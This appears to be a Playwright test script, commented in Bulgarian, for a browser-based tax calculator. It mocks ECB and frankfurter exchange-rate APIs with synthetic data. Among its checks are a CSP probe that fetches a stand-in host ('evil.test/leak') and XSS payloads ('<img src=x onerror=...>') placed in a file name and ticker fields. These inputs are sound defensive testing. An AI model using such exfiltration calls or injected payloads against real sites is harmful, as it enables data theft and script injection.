// Проверка на docs/tax.html в Chromium (Playwright): страницата + docs/tax_core.js върху СИНТЕТИЧНИТЕ файлове от tests/fixtures/tax/. Всяка мрежова заявка се спира и записва;
// „ЕЦБ“ и „frankfurter“ се отговарят от синтетичната таблица (ecb_rates_synthetic.csv) — режим ecb | frankfurter. Резултатът — JSON на stdout за test_tax_page.py.
const path = require('path'), fs = require('fs');
const { chromium } = require('playwright');
const ROOT = path.join(__dirname, '..'), FX = path.join(__dirname, 'fixtures', 'tax');
const RATES = {};                                                     // синтетичната таблица: USD за 1 EUR по дата
fs.readFileSync(path.join(FX, 'ecb_rates_synthetic.csv'), 'utf8').split(/\r?\n/).slice(1).forEach(l => { const p = l.split(','); if (p[1]) RATES[p[0]] = Number(p[1]); });

async function scenario(files, opts) {
  // 05.11.2026: страницата се сервира като http://tax.test/ (CSP 'self' и fetch на файла до нея работят като в GitHub Pages); eurofxref-hist.csv до страницата —
  // синтетичната таблица (opts.site) или 404. Външните заявки се записват; ЕЦБ / frankfurter.dev се отговарят според opts.mode.
  const browser = await chromium.launch();
  const page = await browser.newPage();
  const reqs = [], errors = [], site = [], tries = {};
  page.on('pageerror', e => errors.push(String(e.message)));
  await page.route('**/*', route => {
    const u = route.request().url(), url = new URL(u);
    if (url.host === 'tax.test') {
      if (url.pathname.endsWith('/eurofxref-hist.csv')) { site.push(u); return opts.site ? route.fulfill({ status: 200, contentType: 'text/csv', path: path.join(FX, 'ecb_rates_synthetic.csv') }) : route.fulfill({ status: 404, body: 'no' }); }
      const f = path.join(ROOT, 'docs', url.pathname.replace(/^\//, ''));
      return fs.existsSync(f) ? route.fulfill({ status: 200, path: f, contentType: f.endsWith('.js') ? 'text/javascript' : 'text/html; charset=utf-8' }) : route.fulfill({ status: 404, body: 'no' });
    }
    reqs.push(u);
    tries[u] = (tries[u] || 0) + 1;
    if (u.includes('data-api.ecb.europa.eu') && (opts.mode === 'ecb' || (opts.mode === 'ecbRetry' && tries[u] > 1))) {
      const from = url.searchParams.get('startPeriod'), to = url.searchParams.get('endPeriod');
      const ds = Object.keys(RATES).filter(d => d >= from && d <= to).sort();
      const obs = {}; ds.forEach((d, i) => { obs[String(i)] = [RATES[d]]; });
      return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify({ dataSets: [{ series: { '0:0:0:0:0': { observations: obs } } }],
        structure: { dimensions: { observation: [{ id: 'TIME_PERIOD', values: ds.map(d => ({ id: d })) }] } } }) });
    }
    if (u.includes('api.frankfurter.dev') && opts.mode === 'frankfurter') {
      const [from, to] = url.pathname.replace('/v1/', '').split('..');
      const rates = {}; Object.keys(RATES).filter(d => d >= from && d <= to).forEach(d => { rates[d] = { USD: RATES[d] }; });
      return route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify({ amount: 1, base: 'EUR', rates }) });
    }
    return route.fulfill({ status: 503, body: 'blocked in test' });
  });
  await page.goto('http://tax.test/tax.html');
  const atLoad = reqs.length + site.length;
  let res0 = null;
  await page.setInputFiles('#fi', files);
  await page.waitForFunction(() => document.getElementById('out').style.display !== 'none', null, { timeout: 15000 });   // 05.11.2026: сметката тръгва сама
  if (opts.year) await page.selectOption('#year', String(opts.year));
  if (opts.joint) await page.selectOption('#joint', '1');
  if (opts.kirche) await page.selectOption('#kirche', opts.kirche);
  if (opts.remove != null) {                                           // махане на файл: резултатът изчезва веднага, после идва новият
    res0 = await page.evaluate(i => { const before = S.de.headline; document.querySelector(`[data-rm="${i}"]`).click();
                                      return { before, hiddenAtOnce: document.getElementById('out').style.display === 'none', deAtOnce: S.de }; }, opts.remove);
    await page.waitForFunction(() => document.getElementById('out').style.display !== 'none', null, { timeout: 15000 });
    res0.after = await page.evaluate(() => S.de.headline);
    if (opts.year2) await page.selectOption('#year', String(opts.year2));
  }
  const cspProbe = opts.cspProbe ? await page.evaluate(async () => { try { await fetch('https://evil.test/leak'); return 'sent'; } catch (e) { return 'blocked'; } }) : null;
  const res = await page.evaluate(() => ({ headline: S.de.headline, total: S.de.total, unmatched: S.de.unmatched.map(u => u.sym), big: document.querySelector('#headline .big').textContent,
    warnings: document.getElementById('warnings').innerText, rateSource: S.rateSource, bgVisible: document.getElementById('bg').style.display !== 'none',
    xss: window.__xss || null, csp: !!document.querySelector('meta[http-equiv="Content-Security-Policy"]'), inlineScripts: [...document.scripts].filter(x => !x.src).length, h2: document.querySelector('#headline h2').textContent, files: S.files.map(f => f.name), sales: document.querySelectorAll('#sales tr').length - 1, estimate: S.de.estimate }));
  await browser.close();
  return { ...res, res0, cspProbe, atLoad, requests: reqs, site, tries, errors };
}

(async () => {
  const f = n => path.join(FX, n);
  const IB = ['U1111111_2020.csv', 'U1111111_2021.csv', 'U1111111_2022.csv', 'U1111111_2023.csv', 'U1111111_2023 (1).csv', 'U1111111_Q4_2023.csv', 'U1111111_2026.csv', 'broker2_export.csv'].map(f);
  const out = {};
  out.withEcbFile = await scenario([...IB, f('ecb_rates_synthetic.csv')], { year: 2023, mode: 'none', site: true });
  out.site = await scenario(IB, { year: 2023, mode: 'none', site: true });
  out.ecbApi = await scenario(IB, { year: 2023, mode: 'ecb' });
  out.ecbRetry = await scenario(IB, { year: 2023, mode: 'ecbRetry' });
  out.frankfurter = await scenario(IB, { year: 2023, mode: 'frankfurter' });
  out.noRates = await scenario(IB, { year: 2023, mode: 'none' });
  out.remove = await scenario([...IB, f('ecb_rates_synthetic.csv')], { year: 2023, mode: 'none', remove: 7, year2: 2026 });   // 7 = broker2_export.csv
  // XSS: опасно име на файла и тикър (СИНТЕТИЧНО)
  const tmp = fs.mkdtempSync(path.join(require('os').tmpdir(), 'taxxss-'));
  const evil = path.join(tmp, '<img src=x onerror=window.__xss=1>.csv');
  fs.writeFileSync(evil, 'type,asset_type,ticker,date,quantity,price,currency\nbuy,stock,"<img src=x onerror=window.__xss=2>",2023-01-10,1,10,EUR\nsell,stock,"<img src=x onerror=window.__xss=2>",2023-02-10,1,12,EUR\n');
  out.xss = await scenario([evil], { year: 2023, mode: 'none', cspProbe: true });
  process.stdout.write(JSON.stringify(out));
})().catch(e => { console.error(e); process.exit(1); });
